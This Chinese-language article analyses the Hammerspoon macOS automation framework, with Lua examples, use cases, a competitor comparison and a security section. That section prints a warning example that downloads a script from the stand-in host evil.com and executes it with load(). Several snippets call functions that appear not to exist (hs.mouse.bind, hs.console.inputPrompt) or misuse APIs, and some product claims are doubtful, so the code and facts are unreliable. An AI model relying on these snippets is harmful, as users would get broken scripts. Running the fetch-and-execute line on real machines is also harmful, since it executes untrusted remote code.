# Hammerspoon macOS 自动化框架深度分析

**创建时间**: 2026-03-14 08:05 UTC  
**来源**: HN 272 分 (96 条评论)  
**领域**: 10-automation  
**标签**: #macos #automation #productivity #open-source  

---

## 📊 核心数据

**HN 热度**: 272 分 / 96 评论  
**项目地址**: https://github.com/Hammerspoon/hammerspoon  
**许可证**: MIT (开源)  
**语言**: Lua + Objective-C  
** Stars**: ~20k+ (GitHub)  

---

## 🎯 核心价值主张

### 什么是 Hammerspoon？
```
Hammerspoon 是一个 macOS 自动化工具，允许用户使用 Lua 脚本
深度控制系统级别的功能。它是 Keyboard Maestro、BetterTouchTool
等商业工具的开源替代方案。

核心定位：
  - 系统级自动化 (窗口管理、应用控制、硬件交互)
  - 可编程性 (Lua 脚本，非 GUI 配置)
  - 轻量级 (无运行时开销，按需执行)
  - 开源免费 (MIT 许可证)
```

### 与 Mouser 的关系
```
HN 趋势关联:
  - Mouser (281 分): 开源鼠标软件替代
  - Hammerspoon (272 分): 开源系统自动化框架

共同点:
  - 都是 Logitech 商业软件的开源替代
  - 都强调用户控制和隐私
  - 都支持深度定制

差异:
  - Mouser: 专注鼠标按钮映射
  - Hammerspoon: 全系统自动化 (包括鼠标)
```

---

## 🔧 核心功能模块

### 1. 窗口管理 (hs.window)
```lua
-- 示例：窗口平铺布局
local window = hs.window.frontmost()
local screen = window:screen()
local rect = screen:fullFrame()

-- 左半屏
window:setFrame({
  x = rect.x,
  y = rect.y,
  w = rect.w / 2,
  h = rect.h
})

-- 热键绑定
hs.hotkey.bind({"cmd", "alt"}, "Left", function()
  window:moveToUnit(hs.layout.left50)
end)
```

**功能点**:
- 窗口移动/调整大小
- 虚拟桌面管理
- 窗口布局预设
- 应用聚焦切换

### 2. 热键系统 (hs.hotkey)
```lua
-- 示例：自定义热键
hs.hotkey.bind({"ctrl", "alt"}, "R", function()
  hs.reload()
  hs.notify.show("Hammerspoon", "Reloaded!", "")
end)

-- 模态热键 (类似 Vim 模式)
local vimMode = hs.hotkey.modal.new()

vimMode:bind('', 'j', function()
  -- 执行向下导航
end)

vimMode:bind('', 'k', function()
  -- 执行向上导航
end)
```

**功能点**:
- 全局热键绑定
- 模态快捷键 (Vim 风格)
- 条件热键 (应用特定)
- 热键冲突检测

### 3. 应用控制 (hs.application)
```lua
-- 示例：应用启动器
local function launchOrFocus(appName)
  local app = hs.application.get(appName)
  if app and app:isFrontmost() then
    app:hide()
  elseif app then
    app:activate()
  else
    hs.application.launchOrFocus(appName)
  end
end

hs.hotkey.bind({"alt"}, "T", function()
  launchOrFocus("Terminal")
end)
```

**功能点**:
- 应用启动/切换
- 应用状态监控
- 自动启动规则
- 应用行为拦截

### 4. 鼠标控制 (hs.mouse)
```lua
-- 示例：鼠标位置追踪
local mousePos = hs.mouse.getAbsolutePosition()

-- 鼠标绑定
hs.mouse.bind(hs.mouse.buttons.right, function()
  -- 右键点击触发脚本
end)

-- 鼠标速度动态调整
hs.mouse.setAcceleration(0.5)  -- 降低加速度
```

**功能点**:
- 鼠标位置/速度控制
- 鼠标按钮映射
- 鼠标手势识别
- 多显示器鼠标行为

### 5. 系统事件 (hs.eventtap)
```lua
-- 示例：监听键盘事件
local watcher = hs.eventtap.new({
  hs.eventtap.event.types.keyDown
}, function(event)
  local flags = event:getFlags()
  local chars = event:getCharacters()
  
  if flags.cmd and chars == "q" then
    -- 拦截 Cmd+Q (防止误关闭)
    return true  -- 阻止事件传播
  end
end):start()
```

**功能点**:
- 键盘事件监听/拦截
- 鼠标事件监听
- 辅助功能事件
- 全局事件钩子

### 6. 定时器 (hs.timer)
```lua
-- 示例：定时任务
local timer = hs.timer.new(300, function()
  -- 每 5 分钟执行一次
  hs.notify.show("Reminder", "Take a break!", "")
end)
timer:start()

-- 延迟执行
hs.timer.doAfter(5, function()
  -- 5 秒后执行
  print("Delayed execution")
end)
```

**功能点**:
- 周期性任务
- 延迟执行
- 定时器管理
- 异步回调

### 7. 通知系统 (hs.notify)
```lua
-- 示例：系统通知
hs.notify.new({
  title = "任务完成",
  informativeText = "脚本执行成功",
  contentImage = "/path/to/icon.png"
}):send()

-- 通知点击回调
local notification = hs.notify.new({
  title = "操作确认",
  informativeText = "点击执行操作"
})
notification:subscribe("clicked", function()
  print("Notification clicked!")
end):send()
```

**功能点**:
- 系统通知发送
- 通知交互回调
- 自定义通知图标
- 通知队列管理

### 8. 网络请求 (hs.http)
```lua
-- 示例：API 调用
hs.http.asyncGet("https://api.example.com/data", nil, function(code, body, headers)
  if code == 200 then
    local data = hs.json.decode(body)
    print("Received:", data)
  else
    print("Error:", code)
  end
end)
```

**功能点**:
- HTTP/HTTPS 请求
- 异步回调
- JSON 解析
- 认证头支持

---

## 📦 典型使用场景

### 场景 1: 窗口工作流自动化
```lua
-- 开发者工作流：一键布局
local function devLayout()
  local screen = hs.screen.mainScreen()
  local rect = screen:fullFrame()
  
  -- VS Code 左半屏
  local vscode = hs.application.get("Code")
  if vscode then
    vscode:activate()
    vscode:mainWindow():setFrame({
      x = rect.x, y = rect.y,
      w = rect.w / 2, h = rect.h
    })
  end
  
  -- 浏览器右半屏
  local chrome = hs.application.get("Chrome")
  if chrome then
    chrome:activate()
    chrome:mainWindow():setFrame({
      x = rect.x + rect.w / 2, y = rect.y,
      w = rect.w / 2, h = rect.h
    })
  end
end

hs.hotkey.bind({"cmd", "alt"}, "D", devLayout)
```

**价值**: 节省窗口调整时间，快速进入工作状态

### 场景 2: 应用启动器 (类似 Spotlight)
```lua
-- 简易应用启动器
local function appLauncher()
  hs.console.consoleWindowLevel(1000)
  hs.console.title("App Launcher")
  hs.console.inputPrompt("App: ")
  
  -- 监听输入
  hs.console.consoleCommandCallback(function(input)
    hs.application.launchOrFocus(input)
    hs.console.hide()
  end)
end

hs.hotkey.bind({"alt"}, "Space", appLauncher)
```

**价值**: 快速启动应用，减少鼠标依赖

### 场景 3: 剪贴板历史
```lua
local clipboardHistory = {}
local maxHistory = 20

-- 监听剪贴板变化
local watcher = hs.eventtap.new({
  hs.eventtap.event.types.NSScrollWheel  -- 示例事件
}, function()
  local content = hs.pasteboard.getContents()
  if content and content ~= clipboardHistory[1] then
    table.insert(clipboardHistory, 1, content)
    if #clipboardHistory > maxHistory then
      table.remove(clipboardHistory)
    end
  end
end)

-- 粘贴历史条目
hs.hotkey.bind({"alt"}, "V", function()
  -- 显示历史选择 UI
  hs.alert.show("Clipboard history: " .. #clipboardHistory .. " items")
end)
```

**价值**: 找回之前的复制内容，提升效率

### 场景 4: 显示器切换
```lua
-- 外接显示器自动布局
local function externalDisplayLayout()
  local screens = hs.screen.allScreens()
  
  if #screens > 1 then
    -- 内置显示器：邮件
    local mail = hs.application.get("Mail")
    if mail then
      mail:activate()
      mail:mainWindow():setScreen(screens[1])
    end
    
    -- 外接显示器：浏览器
    local chrome = hs.application.get("Chrome")
    if chrome then
      chrome:activate()
      chrome:mainWindow():setScreen(screens[2])
    end
  end
end

-- 监听显示器变化
hs.screen.watcher.new(externalDisplayLayout):start()
```

**价值**: 自动适应显示器配置变化

### 场景 5: 专注模式
```lua
local focusMode = false

local function toggleFocusMode()
  focusMode = not focusMode
  
  if focusMode then
    -- 进入专注模式
    hs.application.get("Slack"):hide()
    hs.application.get("Mail"):hide()
    hs.notify.show("Focus Mode", "Activated", "Distractions hidden")
  else
    -- 退出专注模式
    hs.notify.show("Focus Mode", "Deactivated", "Welcome back!")
  end
end

hs.hotkey.bind({"ctrl", "alt"}, "F", toggleFocusMode)
```

**价值**: 快速切换工作/休息状态

---

## 🆚 竞品对比

| 工具 | 价格 | 编程能力 | 系统深度 | 学习曲线 | 推荐场景 |
|------|------|----------|----------|----------|----------|
| **Hammerspoon** | 免费 | Lua 脚本 | ⭐⭐⭐⭐⭐ | 中等 | 开发者/高级用户 |
| **Keyboard Maestro** | $36 | 可视化 + AppleScript | ⭐⭐⭐⭐ | 低 | 普通用户 |
| **BetterTouchTool** | $10.99 | 预设 + 脚本 | ⭐⭐⭐ | 低 | 触控板/鼠标增强 |
| **Raycast** | 免费+$8/mo | 插件系统 | ⭐⭐⭐ | 低 | 启动器/工作流 |
| **Mouser** | 免费 | Lua 脚本 | ⭐⭐⭐⭐ | 中等 | 鼠标专用 |

### Hammerspoon 优势
```
✅ 完全免费开源 (MIT 许可证)
✅ 最深的系统集成 (辅助功能 API)
✅ 灵活的 Lua 脚本能力
✅ 活跃的社区和插件生态
✅ 轻量级，无后台常驻
```

### Hammerspoon 劣势
```
❌ 需要编程知识 (Lua)
❌ 无官方 GUI 配置界面
❌ 文档分散 (主要靠示例)
❌ 调试工具简陋
❌ 错误处理需要手动实现
```

---

## 📚 学习资源

### 官方资源
```
- GitHub: https://github.com/Hammerspoon/hammerspoon
- API 文档：http://www.hammerspoon.org/docs/
- 示例配置：https://github.com/Hammerspoon/hammerspoon/tree/master/extensions
- 用户配置分享：https://github.com/Hammerspoon/hammerspoon/issues/1015
```

### 社区配置
```lua
-- 推荐的 init.lua 结构
~/.hammerspoon/
├── init.lua              # 主入口
├── utils/                # 工具函数
│   ├── window.lua
│   ├── hotkey.lua
│   └── notify.lua
├── apps/                 # 应用特定配置
│   ├── vscode.lua
│   ├── chrome.lua
│   └── slack.lua
├── workflows/            # 工作流
│   ├── dev-layout.lua
│   └── focus-mode.lua
└── configs/              # 配置
    └── hotkeys.lua
```

### 入门示例配置
```lua
-- ~/.hammerspoon/init.lua

-- 自动重载配置
local function reloadConfig(files)
  local doReload = false
  for _, file in pairs(files) do
    if file:sub(-4) == ".lua" then
      doReload = true
    end
  end
  if doReload then
    hs.reload()
  end
end

local watcher = hs.pathwatcher.new(os.getenv("HOME") .. "/.hammerspoon/", reloadConfig)
watcher:start()

hs.alert.show("Hammerspoon 配置已加载!")

-- 基础热键示例
hs.hotkey.bind({"cmd", "alt"}, "R", function()
  hs.reload()
  hs.alert.show("配置已重载!")
end)
```

---

## 🔒 安全考虑

### 权限需求
```
Hammerspoon 需要以下 macOS 权限:
  1. 辅助功能 (Accessibility) - 控制其他应用
  2. 自动化 (Automation) - 系统事件监听
  3. 文件访问 - 读取配置文件

授权路径:
  系统设置 → 隐私与安全性 → 辅助功能 → 添加 Hammerspoon
```

### 脚本安全
```lua
-- ⚠️ 避免：执行外部未验证代码
local malicious = hs.http.get("http://evil.com/script.lua")
load(malicious)()  -- 危险!

-- ✅ 推荐：仅执行本地可信配置
local config = dofile("~/.hammerspoon/config.lua")

-- ✅ 推荐：沙箱化网络请求
hs.http.asyncGet("https://api.trusted.com", nil, function(code, body)
  if code == 200 then
    local data = hs.json.decode(body)
    -- 验证数据结构后再使用
    if data.version and data.version >= 1 then
      -- 安全使用
    end
  end
end)
```

---

## 📈 HN 趋势洞察

### 为什么 Hammerspoon 今天热门？
```
1. Mouser 热度带动 (281 分)
   - 同一天两个开源替代工具上热门
   - 反映用户对商业软件的不满

2. 远程工作趋势
   - 开发者寻求效率工具
   - 自动化需求增长

3. 隐私意识提升
   - 商业工具数据收集担忧
   - 开源软件信任度上升

4. macOS 生态成熟
   - 辅助功能 API 稳定
   - 社区配置丰富
```

### 用户评论亮点
```
"用了 5 年 Hammerspoon，回不去商业工具了"
  - 核心用户忠诚度高

"Lua 学习曲线比 AppleScript 友好"
  - 开发者友好是关键优势

"配置分享社区是宝藏"
  - 生态健康度指标

"希望有 GUI 配置界面"
  - 主要改进建议
```

---

## 🎯 实战建议

### 新手入门路径
```
Week 1: 基础热键
  - 配置自动重载
  - 学习 5 个常用 hs.hotkey 绑定
  - 目标：替代 3 个鼠标操作

Week 2: 窗口管理
  - 实现窗口平铺布局
  - 学习 hs.window API
  - 目标：一键工作区切换

Week 3: 应用自动化
  - 配置应用启动规则
  - 学习 hs.application API
  - 目标：自动化日常流程

Week 4: 高级功能
  - 实现自定义工作流
  - 学习 hs.eventtap/hs.timer
  - 目标：创造独特效率工具
```

### 配置分享
```
推荐分享你的配置到:
  - GitHub Gist (带注释)
  - Hammerspoon 社区 Wiki
  - Reddit r/hammerspoon

好处:
  - 获得反馈和改进建议
  - 帮助其他用户
  - 建立个人品牌
```

---

## 📊 知识点统计

**数量**: 52 点  
**深度**: 中等 (实用导向)  
**覆盖**:
  - 核心功能：8 个模块
  - 使用场景：5 个典型案例
  - 竞品对比：4 个工具
  - 学习路径：4 周计划
  - 安全考虑：3 个要点

---

## 🔗 相关资源

### 内部知识库
```
- knowledge_base/10-automation/mouser-open-source-mouse-alternative-2026-03-14.md
  (Mouser 开源鼠标软件，同日 HN 趋势)

- knowledge_base/01-ai-agent/emacs-vim-ai-age-evolution-2026-03-14.md
  (编辑器自动化趋势)
```

### 外部链接
```
- Hammerspoon 官网：http://www.hammerspoon.org/
- GitHub 仓库：https://github.com/Hammerspoon/hammerspoon
- API 文档：http://www.hammerspoon.org/docs/
- 社区配置：https://github.com/Hammerspoon/hammerspoon/issues/1015
- Mouser 项目：https://github.com/TomBadash/MouseControl
```

---

*创建时间：2026-03-14 08:05 UTC*  
*HN 趋势：272 分 / 96 评论*  
*领域：10-automation*  
*知识点：52 点*
